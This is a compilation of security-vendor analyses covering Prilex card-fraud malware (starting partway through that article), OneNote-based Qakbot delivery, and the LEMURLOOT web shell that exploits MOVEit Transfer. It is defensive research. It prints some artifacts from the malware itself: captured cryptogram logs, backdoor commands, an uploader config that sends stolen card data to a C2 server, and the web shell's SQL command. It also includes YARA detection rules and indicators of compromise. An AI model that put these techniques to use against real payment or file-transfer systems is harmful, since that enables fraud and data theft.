Their first PoS malware was spotted in the wild in October 2016.
The first two samples had 2010/2011 as the compilation date, as shown on the graph below.
However, we believe that invalid compilation dates were set due to incorrect system date and time settings.
In later versions, the timestamps corresponded to the times when the samples were discovered.
We also noticed that in the 2022 branch, the developers started using Subversion as the version control system. 
Versions of the Prilex PoS malware: 3 new versions in 2022 (download) 
As we see on the graph, Prilex was highly active in 2020, but suddenly disappeared in 2021, resurfacing in 2022 with a release of three new variants. 
The PoS version of Prilex is coded in Visual Basic, but the stealer module, described in this article, is in p-code.
In a nutshell, this is an intermediate step between high-level instructions in a Visual Basic program and the low-level native code executed by a CPU.
Visual Basic translates p-code statements into native code at runtime. 
A link to the past Prilex is not the only type of PoS malware to originate in Brazil.
We saw a weak link with the old Trojan-Spy.Win32.SPSniffer, which we described in 2010: both families are able to intercept signals from PIN pads, but use different approaches in doing so. PIN pads are equipped with hardware and security features to ensure that security keys are erased if someone tries to tamper with the device.
In fact, the PIN is encrypted in the device upon entry using a variety of encryption schemes and symmetric keys.
Most often, this is a triple DES encoder, making it hard to crack the PIN. 
There is a problem, though: these devices are always connected to a computer via a USB or serial port, which communicates with the EFT software.
Older and outdated PIN pad devices use obsolete and weak cryptography schemes, making it easy for malware to install a USB or serial port sniffer to capture and decrypt the traffic between the PIN pad and the infected system.
This is how SPSniffer gets credit card data.
Sometimes the traffic is not even encrypted. 
SPSniffer: serial port sniffer allowing capture of not-encrypted traffic 
The main approach used by Prilex for capturing credit card data is to use a patch in the PoS system libraries, allowing the malware to collect data transmitted by the software.
The malware will look for the location of a particular set of executables and libraries in order to apply the patch, thus overwriting the original code.
With the patch in place, the malware collects the data from TRACK2, such as the account number and expiration date, in addition to other cardholder information needed to perform fraudulent transactions. 
Initial infection vector Prilex is not a widespread type of malware, as it is not distributed through email spam campaigns.
It is highly targeted and is usually delivered through social engineering, e.g., a target business may receive a call from a “technician” who insists that the company needs to update its PoS software.
The fake technician may visit the target in person or request the victims to install AnyDesk and provide remote access for the “technician” to install the malware. 
Warning from a PoS vendor about Prilex social engineering attacks Messing with the EMV standard Brazil began migrating to EMV in 1999, and today, nearly all cards issued in the country are chip enabled.
A small Java-based application lives inside the chip and can be easily manipulated in order to create a “golden ticket” card that will be valid in most—if not all—point-of-sale systems.
This knowledge has enabled the criminals to upgrade their toolset, allowing them to create their own cards featuring this new technology and keeping them “in the business.” 
The initial versions of Prilex were capable of performing the “replay attack,” where, rather than breaking the EMV protocol, they instead took advantage of poor implementations.
Since payment operators fail to perform some of the validations required by the EMV standard, criminals can exploit this vulnerability within the process to their benefit. 
In this kind of attack, fraudsters push regular magnetic stripe transactions through the card network as EMV purchases, as they are in control of a payment terminal and have the ability to manipulate data fields for transactions put through that terminal.
Later they switched to capturing traffic from real EMV-based chip card transactions.
The thieves could insert stolen card data into the transaction stream, while modifying the merchant and acquirer bank account on the fly. 
Brazilian cybercriminals have successfully launched replay attacks since at least 2014.
As pointed out by Brian Krebs, a small financial institution in New England battled some $120,000 in fraudulent charges from Brazilian stores within less than two days.
The bank managed to block $80,000, but the bank’s processor, which approves incoming transactions when the core systems are offline, let through the other $40,000.
All of the fraudulent transactions were debit charges.
All of them came across MasterCard’s network and appeared to be chip transactions without a PIN to MasterCard’s systems. 
Also worth mentioning is the attack against a German bank in 2019, which registered €1.5 million in losses and used the same technique.
The Prilex gang claimed responsibility.
Judging by the name fields and the functionality of the tool, they probably used the software they are selling in the black market. 
To automate attacks using cloned credit cards, Prilex criminals used tools like Xiello, discovered by our telemetry in 2020.
This tool allows the cybercriminals to use credit cards in a batch when making fraudulent purchases.
It sends the purchase data to credit card acquirers, who then approve or deny the transactions. 
Xiello tool used by Prilex to automate transactions 
As the payment industry and credit card issuers fixed EMV implementation errors, replay attacks became obsolete and ineffective, pushing the Prilex gang to innovate and adopt other ways of credit card fraud. 
From “Replay” to “Ghost” The latest versions of Prilex show certain differences to previous ones in the way the attack occurs: the group has switched from the replay attacks to fraudulent transactions using cryptograms generated by the victim card during the in-store payment process, referred to by the malware authors as “GHOST transactions.” 
In these attacks, the Prilex samples were installed in the system as RAR SFX executables that extracted all required files to the malware directory and executed the installation scripts (VBS files).
From the installed files, we can highlight three modules used in the campaign: a backdoor, which is unchanged in this version except for the C2 servers used for communication; a stealer module; and an uploader module. 
Prilex methods of maintaining persistence The stealer module is responsible for intercepting all communications between the point-of-sale software and the PIN pad used for reading the card during the transaction.
Once it identifies a running transaction, the malware will intercept and modify the content of the transaction in order to be able to capture the card information and to request new EMV cryptograms to the victim’s card.
These cryptograms are then used in the GHOST transactions. 
Method used to parse the PIN pad messages sent/received In order to target a specific process, the criminals will perform an initial screening of the machine—to check if it is an interesting target with enough credit card transactions and to identify the process they will target. 
After the process is identified, the malware will move forward to install the hooks needed to intercept the transaction information.
As the communication between the PoS software and the card reader happens through the COM port, the malware will install a hook to many Windows APIs inside the targeted process, aiming to monitor and change data as needed.
Interestingly enough, instead of allocating memory to the hook procedure, Prilex finds free space within the modules memory, a technique called code cave, making it hard for some security solutions to detect the threat in an infected system. 
Hook code added into CloseHandle process All captured information from the transaction is saved to an encrypted file placed in a directory previously set by the malware configuration.
Those files will later be sent to the malware C2 server, allowing the cybercriminals to make transactions through a fraudulent PoS device registered in the name of a fake company. 
Captured credit card data that will be later sent to the operator server The previous version monitored the transaction in order to get the cryptogram, generated by the card for the original transaction, and then to perform a replay attack using the collected cryptogram.
In this case, the cryptogram has the same ATC (Application Transaction Counter), allowing the fraudulent transaction to be identified by the reuse of the ATC as well as the fact that the date inside the cryptogram did not match the date when it was submitted, as the fraudulent transactions were submitted at a later point in time. 
In GHOST attacks performed by the newer versions of Prilex, it requests new EMV cryptograms after capturing the transaction.
These cryptograms will then be used in a fraudulent transaction through one of the cybercrime tools whose output log can be seen below. 
[START GHOST] _ 80CA9F17 |9F1701039000 | 002000800826435643FFFFFFFF 
| Check PIN9000 _
| 80AE80001D00000000010000000000000000760000008000098620060600B4E5C6EB -> Generate AC80128000AA5EA486052A8886DE06050A03A4B8009000 -> Generated ARQC[END GHOST] 
The table above shows the data collected from the malware.
It contains the Authorization Request Cryptogram (ARQC) that was generated by the card and should now be approved by the card issuer.
After dissecting the response (80128000AA5EA486052A8886DE06050A03A4B8009000), we have the following information. 
Data Field details 80 12 Size of the response: 18 bytes 80 Cryptogram Information Data: ARQC (Authorization Request Cryptogram): go and ask the issuer 00AA ATC: Application Transaction Counter 5EA486052A8886DE Application Cryptogram 06050A03A4B800 Issuer Application Data 9000 Response OK 
Multiple application cryptograms are applied to the card, where the amount of the transaction (blue), ATC (green) and the generated cryptogram (red) change for each transaction. 
[START GHOST] 80CA9F179F1701039000002000800826435643FFFFFFFF900080AE80001D00000000010000000000000000760000008000098620060600B4E5C6EB80128000AA5EA486052A8886DE06050A03A4B8009000 
[END GHOST] 
[START GHOST] 80CA9F179F1701039000002000800826435643FFFFFFFF900080AE80001D00000000100000000000000000760000008000098620060600E22CB55580128000AB8E988F00ACEE5D4806050A03A4B8009000 
[START GHOST] 80CA9F179F1701039000002000800826435643FFFFFFFF900080AE80001D0000000020000000000000000076000000800009862006060007EBA76480128000AC5E1E75557CC57E1206050A03A4B8009000 
[START GHOST]
80CA9F179F1701039000002000800826435643FFFFFFFF900080AE80001D000000003000000000000000007600000080000986200606002598491680128000ADCF54C11A58083ADB06050A03A4B8009000 
[END GHOST] In a nutshell, this is the entire Prilex scheme: Prilex: from infection to cashout Backdoor module The backdoor has many commands, and aside from memory scanning common to memory scrappers, older (ATM) Prilex versions also featured a command to debug a process and peek into its memory.
It is highly likely that this was used to understand target software behavior and perform adjustments on the malware or environment to perform fraudulent transactions.
Older versions of Prilex performed patching on specific software libraries, whereas newer samples do not rely on specific software anymore and will instead hook Windows APIs to perform its job. 
The Prilex debugger Here’s a list of commands used in the ATM version of Prilex, which include debugging: 
Reboot, SendKeys, ShowForm, Inject, UnInject, HideForm, Recursos, GetZip, SetStartup, PausaProcesso, LiberaProcesso, Debug, SendSnapShot, GetStartup, CapRegion, CapFerro, KillProcess, Shell, Process, GetModules, GetConfig, StartSendScreen, StopSendScreen, ReLogin, StartScan, GetKey, SetConfig, RefreshScreen, Download, TakeRegions, Enviar Arquivo, ScanProcessStart, ScanProcessStop, StartRegiao, StopRegiao, StartDownload, StopDownload. 
Even though a new set of commands has been added to the PoS version, we could find some of those from the ATM attack still being used.
Numerous available commands are for general use, allowing the criminals to collect information about the infected machine. 
Command Description Download Download a file from the remote server Shell Execute a specified command via CMD GetConfig Get the configuration file KillProcess Terminate a process SetStartup Add the process to a startup registry key StartSendScreen Start screen capture StopSendScreen Stop screen capture Uploader Module This module is responsible for checking the directory specified in the CABPATH parameter in the config file and sending all cab files generated from the stolen transactions to the server; the files are sent through an HTTP POST request.
The endpoint used by the module is also mentioned in the uploader configuration file. 
[SNDCAB]CABHOST=C2CABPORT=80CABPAGE=/upload.phpCABPATH=c:\cab The use of this module indicates a change in the group’s operation structure, since in the previous version, the collected information was sent to a server whose address was hardcoded into the stealer code, and the module used the same protocol as the backdoor.
This uploader allows the operator to set the endpoint for the collected information as indicated in the configuration file; judging from the samples analyzed, it is possible to see a different infrastructure involved in the process. 
Captured data stored in the uploader C2 Malware-as-a-service In 2019, a website claiming to be affiliated with Prilex started offering what it said was a malware package created by the group.
We have little confidence in these claims: the site could be operated by copycats trying to impersonate the group and catch some money using the reputation Prilex has earned over the years. 
This website was still up and running at the time of writing this. 
The asking price for what is supposedly a Prilex PoS kit is $3,500. 
The website says its owners have worked with Russian cybercriminals in the past, another claim we cannot confirm.
Worth mentioning, too, is that our Digital Footprint Intelligence service found citations of a Prilex malware package sold through Telegram chats, in an underground channel, priced between €10,000 and $13,000.
We have no way of confirming that what is being offered is the real Prilex malware. 
At the same time, Prilex now using Subversion is a clear sign they are working with more than one developer. 
Conclusions The Prilex group has shown a high level of knowledge about credit and debit card transactions, and how software used for payment processing works.
This enables the attackers to keep updating their tools in order to find a way to circumvent the authorization policies, allowing them to perform their attacks. 
Over years of activity, the group has changed its attack techniques a lot.
However, it has always abused processes relating to PoS software to intercept and modify communications with the PIN pad.
Considering that, we strongly suggest that PoS software developers implement self-protection techniques in their modules, such as the protection available through our Kaspersky SDK, aiming to prevent malicious code from tampering with the transactions managed by those modules.
To credit card acquirers and issuers, we recommend avoiding “security by obscurity”: do not underestimate the fraudster.
All EMV validations must be implemented! 
Prilex’s success is the greatest motivator for new families to emerge as fast-evolving and more complex malware with a major impact on the payment chain. 
To financial institutions who fell victims to this kind of fraud, we recommend our Kaspersky Threat Attribution Engine to help IR teams with finding and detecting Prilex files in attacked environments. 
The Prilex family is detected by all Kaspersky products as HEUR:Trojan.Win32.Prilex and HEUR:Trojan.Win64.Prilex.
More details about the threat and a full analysis is available to customers of our Threat Intelligence Reports.
With any requests about our private reports, please contact crimewareintel@kaspersky.com. 
title: The Rising Trend of OneNote Documents for Malware delivery url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rising-trend-of-onenote-documents-for-malware-delivery/ Authored By Anandeshwar Unnikrishnan,Sakshi Jaiswal,Anuradha M McAfee Labs has recently observed a new Malware campaign which used malicious OneNote documents to entice users to click on an embedded file to download and execute the Qakbot trojan. 
OneNote is a Microsoft digital notebook application that can be downloaded for free.
It is a note-taking app that allows collaboration across organizations while enabling users to embed files and other artifacts.
It is installed by default in Microsoft Office 2021 and Microsoft 365. 
Malicious Actors are always trying to find new ways in to infect their victims.
Such as their shift to LNK files after Microsoft introduced a policy change disabled office macros by default.
Due to a feature that allows users to attach files to OneNote documents it makes them a good alternative to LNK files as distribution vehicle to deploy their malware.
This blog contains analysis on how OneNote documents are used malicious and two specific campaigns that made use of OneNote documents to download and execute the Qakbot malware. 
OneNote Campaigns in the wild Figure 1 Campaign Heatmap Figure 1 shows the geo wise distribution of McAfee customers detecting malicious OneNote files. 
Based on the telemetry from our endpoints we have identified the following threat families deployed through OneNote documents: Iceid Qakbot RedLine AsyncRat Remcos AgentTesla QuasarRAT XWORM Netwire Formbook Doubleback Overview Of Malicious OneNote Documents A holistic view of the phishing campaigns that weaponize OneNote document is shown in Figure 2 below. 
The malicious document is delivered in either zip files or ISO images to the target through phishing emails.
We have observed that most of the malicious documents either have Windows batch script that invokes Powershell for dropping the malware on the system or Visual Basic scripts that does the same. 
Figure 2 Campaign Overview The generic theme of the email is invoice or legal related.
These types of themes are more likely to be opened by the vicim.
An example email body and attachment is shown in Figure 3 and 4. Figure 3 Email Body Figure 4 Attachment A Deep Dive into OneNote File Format File Header To understand how the data is laid out in the file, we need to examine it at byte level.
Taking a close look at OneNote document gives us an interesting observation as its magic bytes for the header is not a trivial one.
Figure 5 shows the first 16 bytes of the document binary. 
Figure 5 OneNote Header 
The first 16 bytes need to be interpreted as GUID value {7B5C52E4-D88C-4DA7-AEB1-5378D02996D3}.
We can use the official documentation for OneNote specification to make sense of all the bytes and its structuring.
Figure 6 shows header information taken from the OneNote specification document. 
Figure 6 OneNote Specification The Data Stream in OneNote, Say Hello To FileDataStoreObject To find the embedded data in a OneNote document, we need to learn more about the FileDataStoreObject which has a GUID value of {BDE316E7-2665-4511-A4C4-8D4D0B7A9EAC}.
The structure that holds the data is shown below: guidHeader (16 bytes) Size: 16 bytes Value: {BDE316E7-2665-4511-A4C4-8D4D0B7A9EAC} cbLength Size: 8 bytes Value:
Size of the data unused Size: 4 bytes reserved Size: 8 bytes FileData Size: Variable guidFooter Size: 16 bytes Value: {71FBA722-0F79-4A0B-BB13-899256426B24} 
The FileData member of the FileDataStoreObject is the key member that holds the embedded data in the OneNote document.
The size can be retrieved from the cbLength member. 
Figure 7 shows the “on disk” representation of the FileDataStoreObject This is taken from a malicious OneNote document used to spread the Qakbot payload.
The guidHeader for the data object is highlighted in yellow and the data is shown in red.
As it is evident from the image the data represents a text file which is a script to launch PowerShell. 
Figure 7 Embedded data in Data object For more information on the OneNote specification, go to reference section Artifact Extraction 
Now we have an idea of what the data object is, with this knowledge we can automate the process of extracting embedded artifacts for further analysis from the OneNote document by following the below algorithm. 
Search for FileDataStoreObject GUID in the binary. 
Interpret the FileDataStoreObject structure Retrieve cbLength member (size of the data represented by FileDataStoreObject) 
Read N bytes (cbLength) after Reserved 8 bytes in FileDataStoreObject. 
Dump the bytes read on to disk Repeat above steps for every FileDataStoreObject present in the binary Embedded Executable Objects In OneNote Execution Of Embedded Entities Looking at the runtime characteristics of OneNote Desktop application we have observed that when an embedded file gets executed by the user, it is stored temporarily in the OneNote directory in the User’s Temp location.
Each directory with GUID values represents a different document opened in the OneNote application. 
Figure 8 OneNote directory in Temp By analyzing numerous malicious documents, we have been able to create a “test” OneNote document that executes a batch file that contains the “whoami” command.
The image in Figure 9 show the batch file being created in the user’s temp location. 
Figure 9 OneNote drops embedded artifacts in Temp directory Qakbot Campaign 1: This section contains specific details on a Qakbot campaign.
In campaign 1, the malware author used phishing emails to deliver malicious OneNote document either as attachment or a URL link to zip file containing the OneNote document.
The OneNote contained aHTA file that once executed would make use of the curl utility to download Qakbot and then execute it. 
Infection Flow: Figure 10 Infection Chain Spam email delivers a malicious OneNote file as an attachment or a link to a ZIP file that contains a OneNote file. 
OneNote file contains an embedded HTA attachment and a fake message to lure users to execute the HTA file The HTA file uses curl utility to download the Qakbot payload and is executed by rundll32.exe. 
Technical Analysis: 
The OneNote file with the embedded HTA file is shown in the Figure 11.
Once this OneNote file is opened, it prompts the user with a fake message to double-click on open to view the attachment. 
Figure 11 OneNote Template Upon clicking the Open button, it drops the HTA file with the name Open.hta to the %temp%
Folder and executes it using mshta.exe. Figure 12 Drop file in Temp location 
The HTA file contains obfuscated script as shown below: Figure 13 Obfuscated HTA script The HTA file is loaded by MSHTA and creates a registry key in HKEY_CURRENT_USER\SOFTWARE\ with obfuscated content as shown below: Figure 14 Registry key creation 
The obfuscated registry is then read by MSHTA and the obfuscated code is de-obfuscated.
The code is then initialized to a new function object as shown in Block1. 
Finally, MSHTA calls this function by passing the malicious URL as a parameter and then deletes the registry key as shown in Block 2. 
De-obfuscated content from the HTA file is shown below: Figure 15 Deobfuscated HTA content Curl is used to download the malicious DLL file in C:\ProgramData Folder with .png extension.
The script will then execute the downloaded file with Rundll32.exe with the export function Wind. 
Figure 16 Downloaded payload in ProgramData A fake error message is displayed after loading the downloaded payload and MSHTA is terminated. 
Figure 17 Fake error message Figure 18 shows the process tree of Qakbot: Figure 18 Process Chain IOCs: Type Value Product Detected Campain 1 – OneNote File 88c24db6c7513f47496d2e4b81331af60a70cf8fb491540424d2a0be0b62f5ea Total Protection and LiveSafe VBS/Qakbot.a Campain 1 – HTA File e85f2b92c0c2de054af2147505320e0ce955f08a2ff411a34dce69c28b11b4e4 Total Protection and LiveSafe VBS/Qakbot.b 
Campain 1 – DLL File 15789B9b6f09ab7a498eebbe7c63b21a6a64356c20b7921e11e01cd7b1b495e3 Total Protection and LiveSafe Qakbot-FMZ Campaign 2: Examining Malicious OneNote Documents The OneNote document for campaign 2 is shown in Figure 19.
At first glance it it appears that there is a ‘Open’ button embedded within the document.
The message above the ‘Open’ button instructs the user to “double click” in order to receive the attachment. 
Figure 19 Malicious content A closer look at the document reveals the graphical elements are all images placed in a layered style by the malicious actor.
By moving the icons aside, we can see the malicious batch file which when executed downloads the payload from the Internet and executes on the target system. 
Figure 20 Hidden Malicious dropper script Execution Of Payload Dropper Upon execution of the batch file, Powershell will be invoked and it fetch the Qakbot payload from Internet and execute it on the target system.
This section will cover details of dropper script used to deploy QakBot.
The Figure 21 Show the process tree after the execution of the script and you can see that powershell.exe was launched by cmd.exe and the parent of cmd.exe is onenote.exe. 
Figure 21 Process chain 
The contents of process cmd.exe (7176) are shown below. 
Figure 22 Cmd.exe properties 
The base64 decoded batch file is shown in Figure 23. 
This will use powershell to download the payload and then execute it with rundll32.exe Figure 23 Base64 Decoded instructions in dropper IOCS Type Value Product Detected Campain 2 – Zip File 000fb3799a741d80156c512c792ce09b9c4fbd8db108d63f3fdb0194c122e2a1 Total Protection and LiveSafe VBS/Qakbot.a Campain 2 – OneNote File 2bbfc13c80c7c6e77478ec38d499447288adc78a2e4b3f8da6223db9e3ac2d75 Total Protection and LiveSafe One/Downloader.a Campain 2 – Powershell File b4dd3e93356329c076c0d2cd5ac30a806daf46006bdb81199355952e9d949424 Total Protection and LiveSafe PS/Agent.gs Campain 2 – OneNoteFile a870d31caea7f6925f41b581b98c35b162738034d5d86c0c27c5a8d78404e860 Total Protection and LiveSafe VBS/Qakbot.a Domains: starcomputadoras.com Conclusion: Malware authors are getting more sophisticated when it comes to hiding their payloads.
This Blog highlights the recent Qakbot campaign that delivers its payload which uses the OneNote application as a delivery mechanism.
McAfee Customers should keep their systems up-to-date and refrain from clicking links and opening attachments in suspicious emails to stay protected. References: https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-onestore/405b958b-4cb7-4bac-81cc-ce0184249670 https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-onestore/8806fd18-6735-4874-b111-227b83eaac26 The post The Rising Trend of OneNote Documents for Malware delivery appeared first on McAfee Blog. 
title: Zero-Day Vulnerability in MOVEit Transfer Exploited for Data Theft url: https://www.mandiant.com/resources/blog/zero-day-moveit-data-theft Mandiant has observed wide exploitation of a zero-day vulnerability in the MOVEit Transfer secure managed file transfer software for subsequent data theft.
This vulnerability was announced by Progress Software Corporation on May 31, 2023 and has been assigned CVE-2023-34362.
Based on initial analysis from Mandiant incident response engagements, the earliest evidence of exploitation occurred on May 27, 2023 resulting in deployment of web shells and data theft.
In some instances, data theft has occurred within minutes of the deployment of web shells.
Mandiant currently attributes this activity to UNC4857, a newly created threat cluster with unknown motivations that has impacted organizations operating in a wide range of industries based in Canada, India, and the U.S., but their impact is almost certainly broader.
The seemingly opportunistic nature of this campaign and subsequent data theft activity is consistent with activity that we’ve seen from extortion actors, which means victim organizations could potentially receive ransom emails in the coming days to weeks.
Following exploitation of the vulnerability, the threat actors are deploying a newly discovered LEMURLOOT web shell with filenames that masquerade as human.aspx, which is a legitimate component of the MOVEit Transfer software.
Mandiant has observed several POST requests made to the legitimate guestaccess.aspx file before interaction with the LEMURLOOT webshell, indicating SQLi attacks were directed towards that file. 
We have observed LEMURLOOT samples with the filenames human2.aspx and _human2.aspx.
Various samples with the name human2.aspx were uploaded to VirusTotal beginning on May 28, 2023.
Samples of LEMURLOOT have been uploaded to public repositories from several additional countries—including Italy, Pakistan, and Germany—suggesting that UNC4857 has also impacted organizations in these nations. 
LEMURLOOT provides functionality tailored to execute on a system running MOVEit Transfer software, including the ability to generate commands to enumerate files and folders, retrieve configuration information, and create or delete a user with a hard-coded name.
Initial analysis suggests that the LEMURLOOT web shell is being used to steal data previously uploaded by the users of individual MOVEit Transfer systems. 
Mandiant is aware of multiple cases where large volumes of files have been stolen from victims' MOVEit transfer systems.
LEMURLOOT can also steal Azure Storage Blob information, including credentials, from the MOVEit Transfer application settings, suggesting that actors exploiting this vulnerability may be stealing files from Azure in cases where victims are storing appliance data in Azure Blob storage, although it is unclear if theft is limited to data stored in this way. 
In many cases, the scanning and exploitation leading to the delivery of LEMURLOOT was sourced from IP addresses in the range 5.252.188.0/22, however interaction with the web shell and data theft came from different systems.
Many of the hosts used to support these second-stage operations hosted RDP services with certificates generated between May 19 and 22, which is suggestive of when this infrastructure may have been staged. 
Analysis of this intrusion activity is ongoing and will be reflected on the CAMP.23.037 page within Mandiant Advantage; we will also update this blog post if and when additional information becomes available.
Along with this blog post, Mandiant has produced a detailed MOVEit Containment and Hardening guide to assist organizations with this event.
The document contains guidance on the following key items: Containment Measures Application and Infrastructure Hardening Logging and Hunting Recommendations LEMURLOOT AnalysisLEMURLOOT is a web shell written in C# tailored to interact with the MOVEit Transfer platform.
The malware authenticates incoming connections via a hard-coded password and can run commands that will download files from the MOVEit Transfer system, extract its Azure system settings, retrieve detailed record information, create and insert a particular user, or delete this same user.
Data returned to the system interacting with LEMURLOOT is gzip compressed. 
Authentication and Database Connection LEMURLOOT first checks if an incoming HTTP request contains the header field X-siLock-Comment and a corresponding 36-character GUID-formatted value, which varies across samples.
It effectively uses this GUID as a password and returns an HTTP 404 status code to clients that do not pass the expected header field and value.
If the correct password is passed to LEMURLOOT, it sends a header response X-siLock-Comment and value comment, indicating the connection is successful and can accept tasking.
The malware connects to a SQL server from the executing host using the settings retrieved using SystemSettings.
DatabaseSettings().
It then processes data received from the connecting client, parsing expected commands from the following HTTP header fields: X-siLock-Step1, X-siLock-Step2, and X-siLock-Step3. X-siLock-Step1 Command SequenceIf the value of the header field X-siLock-Step1 is -1, LEMURLOOT retrieves and returns the Azure system settings from MOVEit Transfer, including the configured Azure Blog storage account, and its associated key and container (AzureBlobStorageAccount, AzureBlobKey, and AzureBlobContainer).
It then performs SQL queries to retrieve files, file size, folders, file owners, and institution name data.
The resulting data is gzip compressed and returned to the client interacting with LEMURLOOT. 
If the X-siLock-Step1 header field value is -2, it deletes a user account with the LoginName and RealName set to "Health Check Service" using the SQL command in Figure 1.
Note that this user is inserted using the following functionality. 
Figure 1: MOVEit user deletion command Delete FROM users WHERE RealName='Health Check Service' X-siLock-Step2 and X-siLock-Step3 Command Sequence If the value of header field X-siLock-Step1 is neither -1 or -2, the malware parses the values from header fields X-siLock-Step2 and X-siLock-Step3 and stores them in variables named fileid and folderid, respectively. 
If the values of fileid and folderid are not null, the malware retrieves the file from the local MOVEit Transfer system with these same values, gzip compresses it, and returns it to the connecting client. 
If the fileid and folderid variables are null, LEMURLOOT attempts to identify an existing account with permission level “30” and
InstID = the value set from "X-siLock-Step1" otherwise it creates a new account with a randomly generated username and with LoginName and RealName values set to "Health Check Service" This account is inserted it into an active MOVEit application session. 
Attribution Preliminary analysis has not yet yielded evidence of concrete overlaps between UNC4857 and existing threat clusters at this time.
However, there are some notable, but broad similarities between the tactics, techniques, and procedures (TTPs) used by UNC4857 and those associated with FIN11 data theft extortion activity.
For example, UNC4857 and suspected FIN11 threat cluster UNC2546 have both used zero day vulnerabilities to target file transfer systems, then used tailored web shells for data theft.
Mandiant has also observed at least one actor associated with CLOP recently seeking partners to work on SQL injections.
However, we currently have insufficient evidence to determine if there is a relationship between UNC4857 and FIN11.
Ongoing analysis of emerging activity may provide additional insights.
Implications Mandiant routinely observes threat actors with varying motivations targeting sensitive data.
For example, state-sponsored threat actors have demonstrated ongoing interest in targeting entities with policy research, military and government files, intellectual property, and personally identifiable information.
Cyber criminals can also directly monetize stolen data via extortion operations, post it for sale on underground forums, or leverage it in secondary operations such as business email compromise.
While Mandiant currently has insufficient evidence to attribute this recent activity to a known threat actor, it is reminiscent of prior mass exploitation events targeting file transfer software and leading to FIN11-attributed data theft extortion via the CL0P^_- LEAKS data leak site (DLS).
In multiple cases, several weeks after the attackers steal data, FIN11 sent emails demanding an extortion payment in return for not publishing the data on the CL0P^_- LEAKS DLS.
The delay in reaching out to victim organizations with a ransom demand could be due to various factors, such as extending the amount of time that the zero day vulnerability remained undetected and/or capacity to negotiate with a large number of victims simultaneously.
If the goal of this operation is extortion, we anticipate that victim organizations could receive extortion emails in the coming days to weeks.
Detections The following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated through an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives.
These rules are intended to serve as a starting point for hunting efforts to identify LEMURLOOT payloads; however, they may need adjustment over time if the malware family changes.
YARA rule for detecting compiled LEMURLOOT DLLsrule M_Webshell_LEMURLOOT_DLL_1 { meta: disclaimer = "This rule is meant for hunting and is not tested to run in a production environment" description = "Detects the compiled DLLs generated from human2.aspx LEMURLOOT payloads.
" sample = "c58c2c2ea608c83fad9326055a8271d47d8246dc9cb401e420c0971c67e19cbf" date = "2023/06/01" version = "1" strings: $net = "ASP.NET" $human = "Create_ASP_human2_aspx" $s1 = "X-siLock-Comment" wide $s2 = "X-siLock-Step3" wide $s3 = "X-siLock-Step2" wide $s4 = "Health Check Service" wide $s5 = "attachment; filename={0}" wide condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C))
== 0x00004550 and filesize < 15KB and $net and ( ($human and 2 of ($s*)) or (3 of ($s*)) )}YARA rule for detecting LEMURLOOT ASP.NET scriptsrule M_Webshell_LEMURLOOT_1 { meta: disclaimer
= "This rule is meant for hunting and is not tested to run in a production environment" description = "Detects the LEMURLOOT ASP.NET scripts" md5 = "b69e23cd45c8ac71652737ef44e15a34" sample = "cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45x" date = "2023/06/01" version = "1" strings: $head = "<%@
Page" $s1 = "X-siLock-Comment" $s2 = "X-siLock-Step" $s3 = "Health Check Service" $s4 = /pass, \"[a-z0-9]{8}-[a-z0-9]{4}/ $s5 = "attachment;filename={0}" condition: filesize > 5KB and filesize < 10KB and ( ($head in (0..50) and 2 of ($s*)) or (3 of ($s*)) )
}IndicatorsLEMURLOOT SamplesMD5 SHA256 00c6bce35c40ce1601aa06c4e808c0f1 38e69f4a6d2e81f28ed2dc6df0daf31e73ea365bd2cfc90ebc31441404cca264 04b474e8db353d368e2d791ba5dee6d6 3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b 11eadcf3f1bc9b0ed6994c3ede299ce8 b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272 317552cac7035e35f7bdfc2162dfd29c c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37 359a1141a79480555aa996fd6d9e4af1 702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0 44d8e68c7c4e04ed3adacb5a88450552 387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a 45685c190c91ebe0966e8a0aeca31280 4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf 538d6e172d18d4cebeac211873779ba5 daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4 67fca3e84490dfdddf72e9ba558b589a 6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d 7d5e5537c5346d764f067f66cca426ba 9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead 8cd6c75e6160b90de2a52c967b3d4846 c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4 8d88e451e39506ae258f3aa99da8db9a 0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495 911230b5dca1c43f6d22e65c66b0f6b1 d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195 96d467fd9663cf2e5572f8529e54f13e 5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff 9f3c306dabc3f349b343251f4443412c f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d a85299f78ab5dd05e7f0f11ecea165ea fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f b1bdad086567efd202babf56eac17e1d 9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a b52e56bfc03878cc5cb9eae9d3896808 ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a b69e23cd45c8ac71652737ef44e15a34 cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45 bf7c1dd613101c0a95027249a5fcb759 2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5 c2db1091eb7bac28461877f736d86d83 348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d d71a6b5ae3d89dc33cbbb6877e493d52 b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad ddd95f1c76a1d50b997b2e64274f386a 